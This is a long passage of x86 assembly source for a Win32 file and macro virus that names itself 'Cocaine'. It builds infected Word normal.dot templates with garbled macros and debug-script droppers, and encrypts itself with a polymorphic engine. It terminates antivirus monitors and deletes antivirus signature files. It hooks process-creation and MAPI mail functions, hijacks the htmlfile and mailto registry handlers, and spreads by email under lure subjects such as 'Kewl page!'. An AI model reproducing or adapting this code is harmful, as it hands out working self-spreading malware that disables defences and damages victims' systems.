       push normaldot_size
       mov eax, [ebp+(ofs mm_on_off-ofs vcode)]
       push eax
       lea eax, [ebp+(ofs normaldot_sized-ofs vcode)]
       push eax
       call lzrw1_decompress                   ;unpack normaldot
       mov eax, [ebp+(ofs mm_on_off-ofs vcode)]
       push eax
       mov eax, [ebp+(ofs normaldot_sized-ofs vcode)]
       push eax
       lea eax, [ebp+(ofs directory-ofs vcode)]
       push eax                                ;dump not hidden
       mov dwo [ebp+(ofs wd_att-ofs vcode)], 80h
       call WriteDump                          ;create/write new normal.dot
       push 00004000h+00008000h
       push 0
       push dwo [ebp+(ofs mm_on_off-ofs vcode)]
       call [ebp+(ofs _VirtualFree-ofs vcode)] ;free memory from normal.dot
       call CreateDropper
       push 00000040h
       push 00002000h+00001000h+00100000h
       push 150*1024
       push 0
       call [ebp+(ofs _VirtualAlloc-ofs vcode)]
       mov [ebp+(ofs dbgscript-ofs vcode)], eax
       mov edi, eax
       push eax
       mov esi, [ebp+(ofs mm_on_off-ofs vcode)]
       mov ecx, dwo [ebp+(ofs fsizel-ofs vcode)]
       call script                             ;make debug script
       push 00004000h+00008000h
       push 0
       push dwo [ebp+(ofs mm_on_off-ofs vcode)]
       call [ebp+(ofs _VirtualFree-ofs vcode)] ;free memory from EXE dropper
       pop eax
       sub edi, eax
       mov [ebp+(ofs dbgscript_size-ofs vcode)], edi
       push 00000040h
       push 00002000h+00001000h+00100000h
       push 4*1024
       push 0
       call [ebp+(ofs _VirtualAlloc-ofs vcode)] ;alloc memory for macro text
       mov [ebp+(ofs mm_on_off-ofs vcode)], eax
       lea eax, [ebp+(ofs macros-ofs vcode)]
       push eax
       push macro_size
       mov eax, [ebp+(ofs mm_on_off-ofs vcode)]
       push eax
       lea eax, [ebp+(ofs macro_sized-ofs vcode)]
       push eax
       call lzrw1_decompress                   ;unpack normaldot
       mov ecx, [ebp+(ofs macro_sized-ofs vcode)]
       mov esi, [ebp+(ofs mm_on_off-ofs vcode)]
       lea edi, [esi+ecx+4]                    ;edi=buffer for vars
       mov [ebp+(ofs variables-ofs vcode)], edi
       mov ebx, edi
  @@9:
       lodsb
       cmp al, 'A'
       jb @@10
       cmp al, 'Z'
       ja @@10
       call random_f
       jc @@10
       sub al, 'A'-'a'
  @@10:
       mov [esi-1], al
       loop @@9
       mov ecx, 10                             ;generate variables
  @@13:
       push ecx
       mov eax, 8                             ;lenght of the name of variable
       call random
       inc eax
       inc eax
       mov ecx, eax
  @@12:
       mov eax, 'Z'-'A'
       call random
       add al, 'A'
       call random_f
       jc @@11
       sub al, 'A'-'a'
  @@11:
       stosb
       loop @@12
       sub eax, eax
       stosb
       pop ecx
       loop @@13                         ;next variable
       push 00000040h
       push 00002000h+00001000h+00100000h
       push 4*1024
       push 0
       call [ebp+(ofs _VirtualAlloc-ofs vcode)] ;alloc memory for macro text
       push eax
       mov edi, eax
       mov esi, [ebp+(ofs mm_on_off-ofs vcode)]
  @@14:
       lodsb
       cmp al, '%'
       jne @@18
       lodsb
       sub al, '0'
       push ebx
       push esi
       movzx ecx, al
       mov esi, ebx
  @@15:
       lodsb
       test al, al
       jnz @@15
       loop @@15
  @@16:
       lodsb
       test al, al
       jz @@17
       stosb
       jmp @@16
  @@17:
       pop esi
       pop ebx
       mov al, 12h
     org $-1
  @@18:
       stosb
       lea eax, [ebx-4]
       cmp esi, eax
       jb @@14
       push 00004000h+00008000h
       push 0
       push dwo [ebp+(ofs mm_on_off-ofs vcode)]
       call [ebp+(ofs _VirtualFree-ofs vcode)] ;free mem macro code (unprocess)
       mov ecx, edi
       pop esi
       sub ecx, esi
       push ecx
       mov [ebp+(ofs mm_on_off-ofs vcode)], esi
       push 00000040h
       push 00002000h+00001000h+00100000h
       push 150*1024
       push 0
       call [ebp+(ofs _VirtualAlloc-ofs vcode)] ;alloc memory for macro text
       sub ecx, ecx
       sub ebx, ebx
       mov edi, eax
       xchg eax, [esp]
       xchg eax, ecx
       add ecx, [ebp+(ofs mm_on_off-ofs vcode)];ecx=limit of macro template
       mov by [ebp+(ofs mdeep-ofs vcode)], -1
  @@19:
       mov esi, [ebp+(ofs mm_on_off-ofs vcode)]
       inc ah
       cmp ah, 2
       jne @@20
       mov by [ebp+(ofs mdeep-ofs vcode)], 0
  @@20:
       cmp ah, 8
       jne @@21
       mov by [ebp+(ofs mdeep-ofs vcode)], -1
  @@21:
       cmp ah, 6
       jne @@22
       mov esi, [ebp+(ofs dbgscript-ofs vcode)]
       push ecx
       mov ecx, [ebp+(ofs dbgscript_size-ofs vcode)]
       rep movsb
       pop ecx
       call MacroGarble
       jmp @@19
  @@22:
       cmp ah, 9
       je @@28
  @@23:
       cmp esi, ecx
       jb @@24                               ;all buffer scanned?
       test ebx, ebx
       jz @@19                          ;nothing we was searching exists
       mov esi, [ebp+(ofs mm_on_off-ofs vcode)];it exists, but we skipped!
       sub ebx, ebx
  @@24:
       lodsb
       cmp al, ah
       jne @@27                          ;find line we're searching
       inc ebx                                 ;flag found
       push eax
       mov ax, 100
       call random
       cmp eax, 33                             ;1/3
       pop eax
       jnb @@27                          ;skip this time
       mov by [esi-1], 9                       ;flag as done
  @@25:
       lodsb
       test al, al
       jz @@26
       stosb
       cmp al, 10
       jne @@25
       call MacroGarble                       ;after CRLF, insert garbage
       jmp @@25
  @@26:
       jmp @@23
  @@27:
       lodsb
       test al, al
       jnz @@27                          ;seek till next line
       jmp @@23
  @@28:
       push 00004000h+00008000h
       push 0
       push dwo [ebp+(ofs mm_on_off-ofs vcode)]
       call [ebp+(ofs _VirtualFree-ofs vcode)] ;free memory from macro code
       mov eax, [esp]                         ;get buffer from stack
       push eax
       sub edi, eax
       push edi
       lea eax, [ebp+(ofs cokefile-ofs vcode)]
       push eax
       mov dwo [ebp+(ofs wd_att-ofs vcode)], 82h
       call WriteDump                          ;create/write new normal.dot
       pop eax                                 ;buffer
       push 00004000h+00008000h
       push 0
       push eax
       call [ebp+(ofs _VirtualFree-ofs vcode)] ;free memory from complete code
       push 00004000h+00008000h
       push 0
       push dwo [ebp+(ofs dbgscript-ofs vcode)]
       call [ebp+(ofs _VirtualFree-ofs vcode)] ;free memory from debug script
  @@0:
       sub ecx, ecx
       pop dwo fs:[ecx]
       pop ecx
       sub eax, eax
       mov dwo [ebp+(ofs mm_on_off-ofs vcode)], eax
       add al, '0'
       mov by [ebp+(ofs dmt1-ofs vcode)], al
       mov by [ebp+(ofs dmt2-ofs vcode)+7], al
       mov by [ebp+(ofs outcmd-ofs vcode)+7], al
       mov by [ebp+(ofs ssize-ofs vcode)+7], al
       mov by [ebp+(ofs coda-ofs vcode)+7], al
       mov by [ebp+(ofs dmt3-ofs vcode)+7], al
       mov by [ebp+(ofs dmt4-ofs vcode)+7], al
       mov by [ebp+(ofs dmt5-ofs vcode)+7], al
       ret
MacroSpread endp

MacroGarble proc
       push eax
       push ecx
       push esi
       cmp by [ebp+(ofs mdeep-ofs vcode)], MAX_M_DEEP
       jae @@0
       inc by [ebp+(ofs mdeep-ofs vcode)]
       mov eax, 4
       call random
       add eax, 2
       mov ecx, eax
  @@1:
       push ecx
  @@2:
       mov eax, 16
       call random
       cmp al, 10
       je @@remark
       cmp al, 11
       je @@for
       cmp al, 12
       je @@variables
       cmp al, 13
       je @@if
       cmp al, 14
       je @@10
       jmp @@2
  @@if:
       mov eax, '  fI'
       stosd
       dec edi
       call MakeVar
       mov eax, ' = '
       call random_f
       jc @@3
       dec ah
       call random_f
       jc @@3
       inc ah
       inc ah
  @@3:
       stosd
       dec edi
       call MakeVar
       mov eax, 'ehT '
       stosd
       mov eax, 000a0d00h+'n'
       stosd
       dec edi
       call MacroGarble
       call @@4
       db 'End If', 13, 10
  @@4:
       pop esi
       movsd
       movsd
       jmp @@10
  @@remark:
       call random_f
       jc @@5
       mov al, "'"
       stosb
       jmp @@6
  @@5:
       mov eax, ' meR'
       stosd
  @@6:
       call MakeVar
       call MakeVar
  @@7:
       mov ax, 0a0dh
       stosw
       jmp @@10
  @@variables:
       call MakeVar
       call random_f
       jc @@string
       mov eax, ' = '
       stosd
       dec edi
       call MakeNumber
  @@8:
       jmp @@7
  @@string:
       call MakeVar
       mov eax, ' = $'
       stosd
       mov al, '"'
       stosb
       call MakeVar
       mov al, '"'
       stosb
       jmp @@8
  @@for:
       mov eax, ' roF'
       stosd
       push edi
       call MakeVar
       mov eax, ' = '
       stosd
       dec edi
       call MakeNumber
       mov eax, ' oT '
       stosd
       call MakeNumber
       mov ax, 0a0dh
       stosw
       call MacroGarble
       mov eax, 'txeN'
       stosd
       mov al, ' '
       stosb
       pop esi
  @@9:
       lodsb
       cmp al, ' '
       je @@8
       stosb
       jmp @@9
  @@10:
       pop ecx
       dec ecx
       jnz @@1
       dec by [ebp+(ofs mdeep-ofs vcode)]
  @@0:
       pop esi
       pop ecx
       pop eax
       ret
MacroGarble endp

MakeNumber proc
       push ecx
       push eax
       mov eax, 2
       call random
       inc eax
       mov ecx, eax
  @@1:
       mov eax, '9'-'0'
       call random
       add al, '0'
       stosb
       loop @@1
       pop eax
       pop ecx
       ret
MakeNumber endp

include lz.inc

include macro.inc

update_address proc
       push eax ecx
       db 0b8h
addr   dd 0                                    ;get address to eax
       mov ecx, 4
  @@1:
       rol ax, 4
       call mhex                               ;print hex digits
       loop @@1
       add dwo [ebp+(ofs addr-ofs vcode)], 10h ;update address
       pop ecx eax
       ret
update_address endp

mhex proc
       push eax ebx
       and eax, 01111b                         ;lower nibble
       call $+21
       db '0123456789ABCDEF'
       pop ebx
       xlat                                    ;turn it in hex digit
       stosb
       pop ebx eax
       ret
mhex endp

copy_line proc
       push eax
  @@0:
       lodsb
       or al, al
       jz @@1                                  ;zero found, stop copy
       stosb
       jmp @@0
  @@1:
       pop eax
       ret
copy_line endp

make_hex proc
       push eax ecx esi
       db 0b8h+6
iaddr  dd 0                                    ;esi<->actual buffer position
       inc dwo [ebp+(ofs iaddr-ofs vcode)]     ;set next
       mov al, 20h
       stosb                                   ;print space
       lodsb
       rol al, 4
       call mhex                               ;print upper nibble
       rol al, 4
       call mhex                               ;print lower nibble
       pop esi ecx eax
       loop make_hex
       ret
make_hex endp

script proc
       cld
       call debugmutator
       mov dwo [ebp+(ofs  addr-ofs vcode)], 0100h
       mov [ebp+(ofs iaddr-ofs vcode)], esi    ;set vars
       lea esi, [ebp+(ofs intro-ofs vcode)]
       call copy_line                          ;copy intro code
       mov eax, 16
       cdq
       xchg eax, ecx
       div ecx                                 ;ecx=number of 16-bytes lines
       mov ecx, eax                            ;edx=remainder for last line
  @@0:
       push ecx
       lea esi, [ebp+(ofs outcmd-ofs vcode)]
       call copy_line                          ;print
       call update_address                     ;address
       mov ecx, 16
       call make_hex                           ;code to assemble
       mov eax, 000A0D00h+'"'
       stosd                                   ;next line
       dec edi
       pop ecx
       loop @@0
       mov ecx, edx
       jecxz @@1                               ;no remainder?
       lea esi, [ebp+(ofs outcmd-ofs vcode)]
       call copy_line
       call update_address                     ;make last line
       call make_hex
       mov eax, 000A0D00h+'"'
       stosd
       dec edi
       sub wo [ebp+(ofs addr-ofs vcode)], 10h  ;undo damage
  @@1:
       lea esi, [ebp+(ofs ssize-ofs vcode)]
       call copy_line                          ;rcx
       add wo [ebp+(ofs addr-ofs vcode)], dx
       sub wo [ebp+(ofs addr-ofs vcode)], 100h
       lea esi, [ebp+(ofs ssize-ofs vcode)]
       call copy_line                          ;optimization!
       sub edi, 6
       call update_address                     ;set size
       mov eax, 000A0D00h+'"'
       stosd
       dec edi
       lea esi, [ebp+(ofs coda-ofs vcode)]     ;copy final shit
       call copy_line
       ret
script endp

dbgscript dd 0

dbgscript_size dd 0

intro    db 'Open "C:\COCAINE.SRC" For OutPut As '
dmt1     db '0', 13, 10
dmt2     db 'Print #0, "N C:\W32COKE.EX"',13,10,0

outcmd   db 'Print #0, "E ',0

ssize    db 'Print #0, "RCX"', 13, 10, 0

coda     db 'Print #0, "W"', 13, 10
dmt3     db 'Print #0, "Q"', 13, 10
dmt4     db 'Print #0, ""', 13, 10
dmt5     db 'Close #0', 13, 10, 0

debugmutator proc
       pushad
       mov eax, 9
       call random
       inc eax
       add by [ebp+(ofs dmt1-ofs vcode)], al
       add by [ebp+(ofs dmt2-ofs vcode)+7], al
       add by [ebp+(ofs outcmd-ofs vcode)+7], al
       add by [ebp+(ofs ssize-ofs vcode)+7], al
       add by [ebp+(ofs coda-ofs vcode)+7], al
       add by [ebp+(ofs dmt3-ofs vcode)+7], al
       add by [ebp+(ofs dmt4-ofs vcode)+7], al
       add by [ebp+(ofs dmt5-ofs vcode)+7], al
       popad
       ret
debugmutator endp

macro_end equ this byte

MakeVar proc
       push ecx
       push eax
       mov eax, 5
       call random
       add eax, 4
       mov ecx, eax
  @@1:
       mov al, 'Z'-'A'
       call random
       add al, 'A'
       call random_f
       jc @@2
       sub al, 'A'-'a'
  @@2:
       stosb
       push ecx
       push edi
       call @@3
       db 'AaEeIiOoUu'
  @@3:
       pop edi
       mov ecx, 10
       repne scasb
       jecxz @@4
       dec dwo [esp-1]
  @@4:
       pop edi
       pop ecx
       loop @@1
       stosb
       pop eax
       pop ecx
       ret
MakeVar endp

PatchIT proc
       push esi
       lea edi, [esi+ecx]                      ;destination
       mov ecx, 4
       push eax
       mov esi, esp                            ;fake buffer in stack
       call WriteMem
       pop esi                                 ;remove shit
       pop esi
       ret
PatchIT endp

_base  dd 400000h

NUM_TOPICS EQU 8

topics equ this byte
       dd ofs t0-ofs vcode
       dd ofs t0-ofs vcode
       dd ofs t0-ofs vcode
       dd ofs t1-ofs vcode
       dd ofs t2-ofs vcode
       dd ofs t3-ofs vcode
       dd ofs t4-ofs vcode
       dd ofs t5-ofs vcode

t0     db '', 0
t1     db 'Kewl page!', 0
t2     db 'Improvement to your page', 0
t3     db 'Your page r0x0r!', 0
t4     db 'You must see this...', 0
t5     db 'Secret stuff!', 0


;ESI=Code to encript    (Big enought; Swappable)
;EDI=Place to put code  (Big enought; Swappable)
;ECX=Size of code to encript
;EAX=Delta entrypoint
;EDX=VA where code will run in host
;
;EDI=Final buffer
;ECX=Size
;EAX=New delta entrypoint
mutate proc
       cld
       push eax
       call crypt_poly                         ;decript engine
       mov [ebp+(ofs rva-ofs vcode)], edx
       call random0
       mov [ebp+(ofs cp_key-ofs vcode)], al    ;next memory key
       mov eax, [ebp+(ofs seed-ofs vcode)]
       mov [ebp+(ofs pseed-ofs vcode)], eax
       mov eax, 3
       call random
       push 2
       pop ebx
       add ebx, eax
       or bl, 1
       pop eax
  @@1:
       push ebx
       call poly
       xchg esi, edi                           ;permute bufferz
       pop ebx
       dec ebx
       jnz @@1                                 ;next loop
       xchg esi, edi
       call crypt_poly                         ;encript poly engine after use
       ret
mutate endp

crypt_poly proc
       pushad
       mov al, by [ebp+(ofs cp_key-ofs vcode)]
       mov ecx, ofs egtable-ofs poly
       lea esi, [ebp+(ofs poly-ofs vcode)]
  @@1:
       xor by [esi], al
       inc esi
       loop @@1
       popad
       ret
crypt_poly endp

rbuf   db MAX_BRANCH*(128+4+4) dup (0)

vinit  proc
       mov esp, [esp+8]
       call delta
       lea eax, [ebp+(ofs seh-ofs vcode)]
       mov [esp-4], eax
       call init                               ;get api entries
       jc @@3
       sub eax, eax
       mov ecx, MAX_SOCK+1
       lea edi, [ebp+(ofs _socket-ofs vcode)]
       rep stosd
       mov [ebp+(ofs email_w-ofs vcode)], eax
       mov [ebp+(ofs mm_on_off-ofs vcode)], eax
       mov [ebp+(ofs mdeep-ofs vcode)], al
       lea eax, [ebp+(ofs kernel-ofs vcode)]
       push eax
       call [ebp+(ofs _GetModuleHandle-ofs vcode)]
       mov [ebp+(ofs K32-ofs vcode)], eax      ;save kernel32 base
       lea esi, [ebp+(ofs k32_names-ofs vcode)]
       lea edi, [ebp+(ofs k32_address-ofs vcode)]
  @@1:
       lodsd
       or eax, eax
       jz @@2
       add eax, ebp
       call gpa_kernel32                       ;get all api we want from k32
       jc @@3
       stosd
       jmp @@1
       db 0b9h
  @@2:
       lea eax, [ebp+(ofs user-ofs vcode)]
       push eax
       call [ebp+(ofs _LoadLibraryA-ofs vcode)]
       mov [ebp+(ofs U32-ofs vcode)], eax      ;save user base
  @@4:
       lodsd
       or eax, eax
       jz @@5
       mov ebx, [ebp+(ofs U32-ofs vcode)]
       add eax, ebp
       call gpa_custom                         ;get all api we want again
       jc @@3
       stosd
       jmp @@4
       db 0eah
  @@5:

       call @@adf
       db 'ADVAPI32',0
  @@adf:
       call [ebp+(ofs _LoadLibraryA-ofs vcode)]
       call @@a11
       db 'RegSetValueExA', 0
  @@a11:
       push eax
       call @@aaa
       db 'RegCreateKeyExA', 0
  @@aaa:
       push eax
       call @@baa
       db 'RegOpenKeyExA', 0
  @@baa:
       push eax
       call @@caa
       db 'RegQueryValueExA', 0
  @@caa:
       push eax
       call @@d
       db 'RegCloseKey', 0
  @@d:
       push eax                                ;retrieve all needed APIs
       call [ebp+(ofs _GetProcAddress-ofs vcode)]
       mov [ebp+(ofs _RegCloseKey-ofs vcode)], eax
       call [ebp+(ofs _GetProcAddress-ofs vcode)]
       mov [ebp+(ofs _RegQueryValueEx-ofs vcode)], eax
       call [ebp+(ofs _GetProcAddress-ofs vcode)]
       mov [ebp+(ofs _RegOpenKeyEx-ofs vcode)], eax
       call [ebp+(ofs _GetProcAddress-ofs vcode)]
       mov [ebp+(ofs _RegCreateKeyEx-ofs vcode)], eax
       call [ebp+(ofs _GetProcAddress-ofs vcode)]
       mov [ebp+(ofs _RegSetValueEx-ofs vcode)], eax

       lea eax, [ebp+(ofs wavp-ofs vcode)]
       sub ecx, ecx
       push eax
       push ecx
       call [ebp+(ofs _FindWindowA-ofs vcode)]
       or eax,eax
       jz @@b
       push ecx                                ;terminate AVPM using vg scheme
       push ecx
       push 16
       push eax
       call [ebp+(ofs _PostMessageA-ofs vcode)]
  @@b:

       lea eax, [ebp+(ofs shitfile-ofs vcode)]
       push eax
       call DeleteShitFile

       call @@a1
       db 'KERNEL.AVC', 0
  @@a1:
       call DeleteShitFile
       call @@a2
       db 'SIGN.DEF', 0
  @@a2:
       call DeleteShitFile
       call @@a3
       db 'FIND.DRV', 0
  @@a3:
       call DeleteShitFile
       call @@a4
       db 'NOD32.000', 0
  @@a4:
       call DeleteShitFile
       call @@a5
       db 'DSAVIO32.DLL', 0
  @@a5:
       call DeleteShitFile
       call @@a6
       db 'SCAN.DAT', 0
  @@a6:
       call DeleteShitFile
       call @@a7
       db 'VIRSCAN.DAT', 0
  @@a7:
       call DeleteShitFile

       call @@a8
       db 'C:\COCAINE.SRC', 0
  @@a8:
       call DeleteShitFile

       lea ebx, [ebp+(ofs ancevsys-ofs vcode)]
       push 83h
       push ebx
       call [ebp+(ofs _SetFileAttributesA-ofs vcode)]

       lea esi, [ebp+(ofs current_time-ofs vcode)]
       push esi
       call [ebp+(ofs _GetSystemTime-ofs vcode)]
       lea edi, [ebp+(ofs seed-ofs vcode)]
       sub eax, eax
       lodsw
       lodsw                                   ;init seed with dayofweek/day
       movsd
       push eax
       sub al, MONTH_DELAY                     ;enougth time passed?
       jnc @@6
       add al, 12
  @@6:
       cmp by [ebp+(ofs FunDate-ofs vcode)], al
       mov al, 90h
       je @@7
       add al, 0c3h-90h                        ;nop/ret flip
  @@7:
       mov by [ebp+(ofs Payload-ofs vcode)], al
       pop eax
       add al, MONTH_DELAY
       aam 12                                  ;set trigger date
       mov by [ebp+(ofs FunDate-ofs vcode)], al

       call random0
       mov [ebp+(ofs key1-ofs vcode)], eax
       call random0
       mov [ebp+(ofs key2-ofs vcode)], eax

       call macro_crypt                        ;decript macro stuff

       call MacroSpread

       call random0
       add by [ebp+(ofs macro_key-ofs vcode)], al
       call macro_crypt                        ;encript macro stuff

       lea edx, [ebp+(ofs directory-ofs vcode)]
       push edx
       push MAX_PATH
       call [ebp+(ofs _GetCurrentDirectoryA-ofs vcode)]
       test eax, eax
       jz @@10
       call ProcessDir
  @@10:
IF DIRECT EQ TRUE
       lea edx, [ebp+(ofs directory-ofs vcode)]
       push MAX_PATH
       push edx
       call [ebp+(ofs _GetWindowsDirectoryA-ofs vcode)]
       test eax, eax
       jz @@11
       call ProcessDir
  @@11:
;       lea edx, [ebp+(ofs directory-ofs vcode)]
;       push MAX_PATH
;       push edx
;       call [ebp+(ofs _GetSystemDirectoryA-ofs vcode)]
;       test eax, eax
;       jz @@12
;       call ProcessDir
;  @@12:
ENDIF
       mov esi, [ebp+(ofs _base-ofs vcode)]
  @@a:
       lea eax, [ebp+(ofs NewWinExec-ofs vcode)]
       mov ecx, 0                              ;hook per-process functionz
OldWinExec equ dwo $-4
       jecxz @@8
       call PatchIT
  @@8:
       lea eax, [ebp+(ofs NewCreateProcessA-ofs vcode)]
       mov ecx, 0
OldCreateProcessA equ dwo $-4
       jecxz @@9
       call PatchIT
  @@9:
       lea eax, [ebp+(ofs NewMAPISendMail-ofs vcode)]
       mov ecx, 0
OldMAPISendMail equ dwo $-4
       jecxz @@92
       call PatchIT
  @@92:
       lea eax, [ebp+(ofs NewGetProcAddress-ofs vcode)]
       mov ecx, 0
OldGetProcAddress equ dwo $-4
       jecxz @@93
       call PatchIT
  @@93:

       call Payload
  @@3:
       call delta
       cmp by [ebp+(ofs RestoreChunkz-ofs vcode)], FALSE
       je @@aa

       mov edx, MAX_BRANCH
       lea esi, [ebp+(ofs rbuf-ofs vcode)]
  @@rc1:
       lodsd
       add eax, [ebp+(ofs _base-ofs vcode)]
       mov edi, eax
       lodsd
       mov ecx, eax
       pushad
       call WriteMem
       popad
       lea esi, [esi+ecx]
       dec edx
       jnz @@rc1

  @@aa:
       mov eax, 365
       call random
       cmp ax, 24
       jne @sajsj
       call GetList
       lea eax, [ebp+(ofs directory-ofs vcode)]
       push eax
       call DeleteShitFile
  @sajsj:

       call OpenAncev
       jc @@jdjd
       lea eax, [ebp+(ofs cokefile-ofs vcode)]
       push eax
       call DeleteShitFile
  @@jdjd:

       mov eax, NUM_TOPICS
       call random
       mov eax, [ebp+(ofs topics-ofs vcode)+(eax*4)]
       add eax, ebp
       mov [ebp+(ofs subject-ofs vcode)], eax

IF DIRECT EQ TRUE
       inc dwo [ebp+(ofs what_key-ofs vcode)]
       call @@2323
       db 'SOFTWARE\Classes\htmlfile\shell\open\command', 0
  @@2323:
       pop eax
       call ConsultKey
       call FixKey
       sub eax, eax
       mov dwo [ebp+(ofs fsizel-ofs vcode)], eax
       mov dwo [ebp+(ofs mm_on_off-ofs vcode)], eax
       call Infect

       call @@2324
       db 'SOFTWARE\Classes\mailto\shell\open\command', 0
  @@2324:
       pop eax
       call ConsultKey
       call FixKey
       sub eax, eax
       mov dwo [ebp+(ofs fsizel-ofs vcode)], eax
       call Infect
       dec dwo [ebp+(ofs what_key-ofs vcode)]
ENDIF

       sub eax, eax
       lea esi, [ebp+(ofs thread-ofs vcode)]
       push esi
       push eax
       push ebp
       lea esi, [ebp+(ofs MailThread-ofs vcode)]
       push esi
       push eax
       push eax
       call [ebp+(ofs _CreateThread-ofs vcode)]
       call http_install
  ret2host:
       pop dwo fs:[0]                          ;restore seh frame
       pop eax
       jmp host                                ;jmp to host
vinit  endp

host_entry equ dwo $-4

seh:
       mov esp, [esp+8]
       jmp ret2host

FixKey proc
       push -2
       pop ecx
       mov edi, esi
  @@0:
       lodsb
       cmp al, '"'
       je @@1
       test al, al
       jz @@2
       cmp al, ' '
       jne @@3
       cmp ecx, -2
       je @@2
  @@3:
       stosb
       jmp @@0
  @@1:
       inc ecx
       jecxz @@2
       jmp @@0
  @@2:
       sub eax, eax
       stosb
       ret
FixKey endp

cokefile db 'C:\COCAINE.SYS', 0

init   proc
       mov ecx, esp
       call @@3
       mov esp, [esp+8]                        ;fix stack
  @@1:
       call delta
       stc                                     ;signal error
       mov cl, ?
       org $-1
  @@2:
       clc                                     ;signal sucess
       pop dwo fs:[0]                          ;restore seh frame
       sahf
       add esp, 4
       lahf
       ret
       db 081h
  @@3:
       sub eax, eax
       push dwo fs:[eax]
       mov fs:[eax], esp                       ;set new seh frame
       mov eax, 0                              ;is GetModuleHandleA imported?
OldGetModuleHandleA equ dwo $-4
       test eax, eax
       jz @@5
       add eax, [ebp+(ofs _base-ofs vcode)]
       lea edx, [ebp+(ofs kernel-ofs vcode)]
       push edx
       call [eax]                              ;use imported API to get
       test eax, eax                           ;kernel32 module
       jz @@5
       mov edx, eax
       jmp @@4
  @@5:
       mov eax, 077f00000h                     ;wNT base
       push eax
       call check_base
       pop edx
       jz @@4
       mov eax, 077e00000h                     ;wNT 5 base
       push eax
       call check_base
       pop edx
       jz @@4
       mov eax, 0bff70000h                     ;w9x base
       push eax
       call check_base
       pop edx
       jnz @@1
  @@4:
       mov eax, edx
       mov ebx, eax
       call delta
       add eax, [eax+3ch]
       cmp dwo [eax], 'EP'
       jne @@1
       add ebx, [eax+120]                      ;export table
       lea eax, [ebp+(ofs sGetModuleHandle-ofs vcode)]
       mov dwo [ebp+(ofs size_search-ofs vcode)], 17
       mov [ebp+(ofs string_search-ofs vcode)], eax
       call search_et                          ;get GetModuleHandle
       jc @@1
       mov [ebp+(ofs _GetModuleHandle-ofs vcode)], eax
       lea eax, [ebp+(ofs sGetProcAddress-ofs vcode)]
       mov dwo [ebp+(ofs size_search-ofs vcode)], 15
       mov [ebp+(ofs string_search-ofs vcode)], eax
       call search_et                          ;get GetProcAddress
       jc @@1
       mov [ebp+(ofs _GetProcAddress-ofs vcode)], eax
       jmp @@2
init   endp

check_base proc
       call @@1
       mov esp, [esp+8]
       call delta
       cmp eax, esp
       jmp @@0
  @@1:
       push dwo fs:[0]
       mov fs:[0], esp
       cmp wo [eax], 'ZM'
  @@0:
       pop dwo fs:[0]
       pop eax
       ret
check_base endp

search_et proc
       mov eax, [ebx+32]
       add eax, edx                            ;name table ptr
  @@1:
       mov esi, [eax]
       or esi, esi
       jz @@3                                  ;nul ptr
       add esi, edx
       mov edi, 0
string_search equ dwo $-4
       mov ecx, 0
size_search equ dwo $-4
       rep cmpsb                               ;the one we search?
       jz @@2
       add eax, 4
       jmp @@1                                 ;check next api
  @@2:
       sub eax, [ebx+32]
       sub eax, edx
       shr eax, 1                              ;div by 2
       add eax, [ebx+36]
       add eax, edx
       movzx eax, wo [eax]
       shl eax, 2                              ;mul by 4
       add eax, [ebx+28]
       add eax, edx
       mov eax, [eax]
       add eax, edx
       clc                                     ;signal sucess
       mov cl, 12h
     org $-1
  @@3:
       stc                                     ;signal error
       ret
search_et endp

gpa_custom proc
       push eax                                ;pointer to api wanted
       push ebx                                ;module handle
       jmp _gpa
       db 66h

gpa_kernel32 proc
       push eax
       push dwo [ebp+(ofs K32-ofs vcode)]
  _gpa:
       call [ebp+(ofs _GetProcAddress-ofs vcode)]
       or eax, eax
       jz @@1
       clc
       mov cl, 12h
     org $-1
  @@1:
       stc
       ret
gpa_kernel32 endp
gpa_custom endp

MAX_RECURSION   = 3
JMP_MAX         = 16
MAX_SUBROUTINES = 16

flg    record{
       _key:1,                                 ;1key isnt necessary     ;4
       _encriptor:2                            ;XOR = 00
                                               ;NOT = 01
                                               ;ADD = 10
                                               ;SUB = 11                ;23
       _bwd_fwd:1,                             ;0inc/1dec counter       ;1
       _direction:1,                           ;1backward/0forward      ;0
       }

       pushf
       db 09ah

poly   proc                                    ;encripted in memory!
       push esi
       mov [ebp+(ofs entry-ofs vcode)], eax
       mov [ebp+(ofs buffer-ofs vcode)], edi
       mov [ebp+(ofs _size-ofs vcode)], ecx    ;save entry values
       sub eax, eax
       mov [ebp+(ofs reg32-ofs vcode)], eax
       mov [ebp+(ofs recurse-ofs vcode)], eax  ;init internal vars
       mov [ebp+(ofs lparm-ofs vcode)], eax
       mov [ebp+(ofs lvars-ofs vcode)], eax
       mov [ebp+(ofs subs_index-ofs vcode)], eax
       mov [ebp+(ofs s_into-ofs vcode)], eax   ;(dword)
       call random0
       and eax, mask _bwd_fwd + mask _direction + mask _encriptor
       mov [ebp+(ofs flagz-ofs vcode)], eax    ;set engine flagz
       mov edx, eax
       and edx, 11b
       call random0
       mov [ebp+(ofs key-ofs vcode)], al       ;choose key
       lea ebx, [ebp+(ofs crypt_table-ofs vcode)]
       test edx, 10b
       jz @@0
       add ebx, 6                              ;next table
  @@0:
       test edx, 01b
       jz @@1
       add ebx, 3                              ;second choice
  @@1:
       mov ax, wo [ebx]
       mov [ebp+(ofs _dec-ofs vcode)], ax
       mov al, by [ebx+2]
       mov [ebp+(ofs _enc-ofs vcode)], al
       dec edx
       jnz @@2
       mov by [ebp+(ofs key-ofs vcode)], 0D0h  ;not dont use key
       bts dwo [ebp+(ofs flagz-ofs vcode)], 6  ;(mask _key)
  @@2:
       jmp @@3                                 ;flush piq
  @@3:
       lodsb
  _enc db 00
  key  db 00
       stosb
       loop @@3                                ;crypt code
       mov eax, 64
       call random
       mov ecx, eax
       call _shit
       mov [ebp+(ofs decriptor-ofs vcode)], edi;here the decriptor start
       call garble                             ;start of decriptor
       lea ebx, [ebp+(ofs make_counter-ofs vcode)]
       lea edx, [ebp+(ofs make_pointer-ofs vcode)]
       call swapper                            ;setup start of poly decriptor
       push edi                                ;loop start here
       call garble
       mov eax, [ebp+(ofs _dec-ofs vcode)]
       mov edx, [ebp+(ofs p_reg-ofs vcode)]
       or ah, dl
       stosw                                   ;store crypt instr
       bt dwo [ebp+(ofs flagz-ofs vcode)], 6   ;(mask _key)
       jc @@4
       mov al, by [ebp+(ofs key-ofs vcode)]
       stosb                                   ;store key
  @@4:
       call garble
       lea ebx, [ebp+(ofs upd_counter-ofs vcode)]
       lea edx, [ebp+(ofs upd_pointer-ofs vcode)]
       call swapper                            ;update counter and pointer
       mov edx, [ebp+(ofs c_reg-ofs vcode)]
       call random
